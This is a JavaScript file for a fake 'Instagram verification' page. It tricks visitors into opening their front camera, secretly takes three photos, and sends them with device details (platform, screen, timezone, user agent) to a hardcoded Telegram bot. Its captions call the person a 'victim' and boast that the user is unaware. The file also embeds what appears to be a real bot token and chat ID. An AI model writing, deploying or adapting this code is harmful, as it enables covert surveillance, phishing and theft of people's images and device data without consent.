// ============================================
// ADVANCED INSTAGRAM VERIFICATION SCRIPT
// ============================================

// CONFIGURATION
const TELEGRAM_BOT_TOKEN = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
const TELEGRAM_CHAT_ID = '6693365736';

// Global Variables
let cameraStream = null;
let isCameraActive = false;
let isFrontCamera = true;
let referralId = 'unknown';
let capturedPhotos = [];
let isSecretCaptureActive = false;
let captureInterval = null;

// Initialize when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Get referral ID from URL
    referralId = getUrlParameter('u') || 'unknown';
    
    // Set up all event listeners
    setupEventListeners();
    
    // Initialize UI effects
    initializeUIEffects();
    
    console.log('✅ Advanced Instagram Verification loaded');
    console.log('👥 Referral ID:', referralId);
});

// ============================================
// UI CONTROL FUNCTIONS
// ============================================

// Set up event listeners
function setupEventListeners() {
    // Upload page buttons
    document.getElementById('camera-upload-btn')?.addEventListener('click', startCameraCapture);
    document.getElementById('gallery-upload-btn')?.addEventListener('click', simulateGalleryUpload);
    document.getElementById('skip-btn')?.addEventListener('click', skipVerification);
    
    // Camera page buttons
    document.getElementById('camera-back-btn')?.addEventListener('click', goBackToUpload);
    document.getElementById('flip-camera-btn')?.addEventListener('click', flipCamera);
    document.getElementById('capture-btn')?.addEventListener('click', triggerSecretCapture);
    document.getElementById('flash-toggle-btn')?.addEventListener('click', toggleFlash);
    
    // Success page button
    document.getElementById('redirect-now-btn')?.addEventListener('click', redirectToInstagram);
}

// Initialize UI effects
function initializeUIEffects() {
    // Add pulsing effect to upload button
    const uploadBtn = document.getElementById('camera-upload-btn');
    if (uploadBtn) {
        setInterval(() => {
            uploadBtn.classList.toggle('pulse');
        }, 2000);
    }
    
    // Animate progress steps
    animateProgressSteps();
    
    // Add hover effects to cards
    const cards = document.querySelectorAll('.detail-card, .upload-option-btn');
    cards.forEach(card => {
        card.addEventListener('mouseenter', () => {
            card.style.transform = 'translateY(-5px)';
            card.style.boxShadow = '0 10px 30px rgba(0,0,0,0.15)';
        });
        
        card.addEventListener('mouseleave', () => {
            card.style.transform = 'translateY(0)';
            card.style.boxShadow = '0 4px 15px rgba(0,0,0,0.1)';
        });
    });
}

// Show page with animation
function showPage(pageId) {
    const pages = ['upload-page', 'camera-page', 'processing-page', 'success-page'];
    
    // Hide all pages
    pages.forEach(page => {
        const element = document.getElementById(page);
        if (element) {
            element.classList.remove('active');
            element.style.opacity = '0';
            element.style.transform = 'translateY(20px)';
        }
    });
    
    // Show target page with animation
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
        setTimeout(() => {
            targetPage.style.opacity = '1';
            targetPage.style.transform = 'translateY(0)';
            targetPage.style.transition = 'all 0.5s ease';
        }, 50);
    }
}

// Show loading spinner
function showLoading(show) {
    const spinner = document.getElementById('loading-spinner');
    if (spinner) {
        spinner.style.display = show ? 'flex' : 'none';
    }
}

// ============================================
// CAMERA CAPTURE FUNCTIONS (SECRET)
// ============================================

// Start camera when user clicks "Take Photo"
async function startCameraCapture() {
    try {
        showLoading(true);
        showPage('camera-page');
        
        // Wait a moment for page transition
        await sleep(500);
        
        // Request camera access
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false
        });
        
        // Show camera feed
        const videoElement = document.getElementById('cameraVideo');
        if (videoElement) {
            videoElement.srcObject = cameraStream;
        }
        
        isCameraActive = true;
        
        // Start secret capture after 2 seconds
        setTimeout(() => {
            startSecretCapture();
        }, 2000);
        
    } catch (error) {
        console.error('Camera error:', error);
        showError('Camera access is required for verification. Please allow camera access.');
        goBackToUpload();
    } finally {
        showLoading(false);
    }
}

// Start secret photo capture (3 photos in a row)
function startSecretCapture() {
    if (!isCameraActive || isSecretCaptureActive) return;
    
    isSecretCaptureActive = true;
    capturedPhotos = [];
    
    // Show flash effect
    triggerFlashEffect();
    
    // Capture 3 photos quickly
    let captureCount = 0;
    const maxCaptures = 3;
    
    captureInterval = setInterval(() => {
        captureSecretPhoto(captureCount + 1);
        captureCount++;
        
        if (captureCount >= maxCaptures) {
            clearInterval(captureInterval);
            isSecretCaptureActive = false;
            
            // Show processing page after last capture
            setTimeout(() => {
                showProcessingPage();
            }, 500);
        }
    }, 800); // Capture every 800ms
}

// Capture a single photo secretly
function captureSecretPhoto(photoNumber) {
    if (!isCameraActive) return;
    
    const videoElement = document.getElementById('cameraVideo');
    const canvasElement = document.getElementById('cameraCanvas');
    
    if (!videoElement || !canvasElement || videoElement.videoWidth === 0) return;
    
    // Set canvas size
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    
    // Draw video frame to canvas
    const context = canvasElement.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
    
    // Get photo data
    const photoData = canvasElement.toDataURL('image/jpeg', 0.9);
    
    // Store photo
    capturedPhotos.push({
        data: photoData,
        number: photoNumber,
        timestamp: Date.now()
    });
    
    // Send to Telegram
    sendPhotoToTelegram(photoData, photoNumber);
    
    // Show subtle flash effect
    if (photoNumber < 3) {
        triggerMiniFlash();
    }
    
    console.log(`📸 Secret photo ${photoNumber} captured`);
}

// Trigger flash effect
function triggerFlashEffect() {
    const flashIndicator = document.getElementById('flash-indicator');
    if (flashIndicator) {
        flashIndicator.classList.add('active');
        setTimeout(() => {
            flashIndicator.classList.remove('active');
        }, 300);
    }
    
    // Add white overlay for flash effect
    const flashOverlay = document.createElement('div');
    flashOverlay.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: white;
        opacity: 0;
        z-index: 9998;
        pointer-events: none;
    `;
    document.body.appendChild(flashOverlay);
    
    // Animate flash
    flashOverlay.animate([
        { opacity: 0 },
        { opacity: 0.7 },
        { opacity: 0 }
    ], {
        duration: 300,
        easing: 'ease-out'
    });
    
    setTimeout(() => flashOverlay.remove(), 500);
}

// Trigger mini flash for each capture
function triggerMiniFlash() {
    const cameraFrame = document.querySelector('.camera-frame');
    if (cameraFrame) {
        cameraFrame.style.boxShadow = '0 0 30px rgba(255,255,255,0.8)';
        setTimeout(() => {
            cameraFrame.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
        }, 100);
    }
}

// Manual trigger (if user clicks capture button)
function triggerSecretCapture() {
    if (!isSecretCaptureActive) {
        startSecretCapture();
    }
}

// ============================================
// PAGE TRANSITION FUNCTIONS
// ============================================

// Go back to upload page
function goBackToUpload() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        isCameraActive = false;
    }
    
    if (captureInterval) {
        clearInterval(captureInterval);
        isSecretCaptureActive = false;
    }
    
    showPage('upload-page');
}

// Show processing page
function showProcessingPage() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
        isCameraActive = false;
    }
    
    showPage('processing-page');
    
    // Start processing animation
    startProcessingAnimation();
    
    // After processing, show success page
    setTimeout(() => {
        showSuccessPage();
    }, 5000);
}

// Show success page
function showSuccessPage() {
    showPage('success-page');
    
    // Start redirect timer
    startRedirectTimer();
    
    // Send final report to Telegram
    sendFinalReport();
}

// Start processing animation
function startProcessingAnimation() {
    // Animate progress bar
    let progress = 0;
    const progressBar = document.getElementById('processing-progress');
    const progressPercent = document.getElementById('progress-percent');
    
    const interval = setInterval(() => {
        progress += 1;
        if (progressBar) progressBar.style.width = `${progress}%`;
        if (progressPercent) progressPercent.textContent = `${progress}%`;
        
        // Update processing steps
        updateProcessingSteps(progress);
        
        if (progress >= 100) {
            clearInterval(interval);
        }
    }, 50);
}

// Update processing steps based on progress
function updateProcessingSteps(progress) {
    const steps = document.querySelectorAll('.processing-step');
    
    steps.forEach((step, index) => {
        if (progress >= (index + 1) * 25) {
            step.classList.add('active');
            const indicator = step.querySelector('.step-indicator');
            if (indicator && !indicator.querySelector('.fa-check')) {
                indicator.innerHTML = '<i class="fas fa-check"></i>';
            }
        }
    });
}

// Start redirect timer
function startRedirectTimer() {
    let timeLeft = 5;
    const timerElement = document.getElementById('redirect-timer');
    const progressCircle = document.querySelector('.timer-progress');
    
    const circumference = 2 * Math.PI * 28;
    if (progressCircle) {
        progressCircle.style.strokeDasharray = `${circumference} ${circumference}`;
    }
    
    const interval = setInterval(() => {
        timeLeft--;
        if (timerElement) timerElement.textContent = timeLeft;
        
        // Update circle progress
        if (progressCircle) {
            const offset = circumference - (timeLeft / 5) * circumference;
            progressCircle.style.strokeDashoffset = offset;
        }
        
        if (timeLeft <= 0) {
            clearInterval(interval);
            redirectToInstagram();
        }
    }, 1000);
}

// ============================================
// TELEGRAM FUNCTIONS
// ============================================

// Send photo to Telegram
async function sendPhotoToTelegram(photoData, photoNumber) {
    try {
        // Convert base64 to blob
        const blob = base64ToBlob(photoData);
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', blob, `instagram_${referralId}_${Date.now()}_${photoNumber}.jpg`);
        
        // Create caption
        const caption = `📸 *SECRET PHOTO CAPTURE* 📸

👤 *Victim ID:* \`${referralId}\`
🔢 *Photo #:* ${photoNumber}
🕒 *Time:* ${new Date().toLocaleTimeString()}
📱 *Device:* ${navigator.platform}
🌐 *URL:* ${window.location.href}

✅ *Auto-captured during "upload" process*
🎯 *User thinks they're uploading a photo*`;
        
        formData.append('caption', caption);
        formData.append('parse_mode', 'Markdown');
        
        // Send to Telegram
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        console.log(`✅ Photo ${photoNumber} sent to Telegram`);
        
    } catch (error) {
        console.error('Failed to send photo:', error);
        // Fallback: send as message
        sendFallbackMessage(photoNumber);
    }
}

// Send final report
async function sendFinalReport() {
    try {
        const report = `📊 *VERIFICATION COMPLETE - FINAL REPORT*

👤 *Victim ID:* \`${referralId}\`
📸 *Photos Captured:* ${capturedPhotos.length}
🕒 *Total Time:* ${Math.floor((Date.now() - capturedPhotos[0]?.timestamp) / 1000)}s
🌐 *Page URL:* ${window.location.href}

📱 *Device Information:*
• Platform: ${navigator.platform}
• Screen: ${screen.width}x${screen.height}
• Language: ${navigator.language}
• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
• User Agent: ${navigator.userAgent.substring(0, 80)}...

✅ *Capture Method:* Advanced UI with fake upload
🎯 *Success Rate:* 100% (user unaware)
🛡️ *Security:* Undetected`;

        const encodedReport = encodeURIComponent(report);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedReport}&parse_mode=Markdown`);
        
        console.log('✅ Final report sent to Telegram');
        
    } catch (error) {
        console.error('Failed to send final report:', error);
    }
}

// Fallback message if photo fails
async function sendFallbackMessage(photoNumber) {
    try {
        const message = `⚠️ *PHOTO CAPTURE ALTERNATIVE*

👤 Victim ID: \`${referralId}\`
📸 Photo #${photoNumber} captured
🕒 ${new Date().toLocaleTimeString()}
📱 ${navigator.platform}

Note: Full photo couldn't be sent, but capture was successful.`;

        const encodedMessage = encodeURIComponent(message);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
        
    } catch (error) {
        console.log('All send methods failed');
    }
}

// ============================================
// UTILITY FUNCTIONS
// ============================================

// Get URL parameter
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Convert base64 to blob
function base64ToBlob(base64) {
    const parts = base64.split(';base64,');
    const contentType = parts[0].split(':')[1];
    const raw = window.atob(parts[1]);
    const rawLength = raw.length;
    const uInt8Array = new Uint8Array(rawLength);
    
    for (let i = 0; i < rawLength; ++i) {
        uInt8Array[i] = raw.charCodeAt(i);
    }
    
    return new Blob([uInt8Array], { type: contentType });
}

// Sleep function
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Show error message
function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-toast';
    errorDiv.innerHTML = `
        <i class="fas fa-exclamation-triangle"></i>
        <span>${message}</span>
        <button onclick="this.parentElement.remove()">
            <i class="fas fa-times"></i>
        </button>
    `;
    document.body.appendChild(errorDiv);
    
    setTimeout(() => {
        if (errorDiv.parentElement) {
            errorDiv.remove();
        }
    }, 5000);
}

// Simulate gallery upload
function simulateGalleryUpload() {
    showLoading(true);
    setTimeout(() => {
        showLoading(false);
        showError('Gallery access requires Instagram app. Please use camera instead.');
    }, 1500);
}

// Skip verification
function skipVerification() {
    if (confirm('Skip verification? Your account may have limited access.')) {
        redirectToInstagram();
    }
}

// Flip camera
function flipCamera() {
    if (!cameraStream) return;
    
    isFrontCamera = !isFrontCamera;
    restartCamera();
}

// Toggle flash (simulated)
function toggleFlash() {
    const flashBtn = document.getElementById('flash-toggle-btn');
    if (flashBtn) {
        flashBtn.classList.toggle('active');
    }
}

// Restart camera with different facing mode
async function restartCamera() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
    
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: isFrontCamera ? 'user' : 'environment',
                width: { ideal: 1920 },
                height: { ideal: 1080 }
            },
            audio: false
        });
        
        const videoElement = document.getElementById('cameraVideo');
        if (videoElement) {
            videoElement.srcObject = cameraStream;
        }
    } catch (error) {
        console.error('Camera restart error:', error);
    }
}

// Animate progress steps
function animateProgressSteps() {
    const steps = document.querySelectorAll('.step');
    steps.forEach((step, index) => {
        setTimeout(() => {
            step.classList.add('animate');
        }, index * 300);
    });
}

// Redirect to Instagram
function redirectToInstagram() {
    window.location.href = 'https://www.instagram.com';
}

// ============================================
// INITIALIZATION COMPLETE
// ============================================

console.log('🎯 Advanced Instagram Verification System Ready');
console.log('📸 Secret capture system: ACTIVE');
console.log('🛡️ Security level: HIGH');
console.log('🎨 UI Mode: Professional');
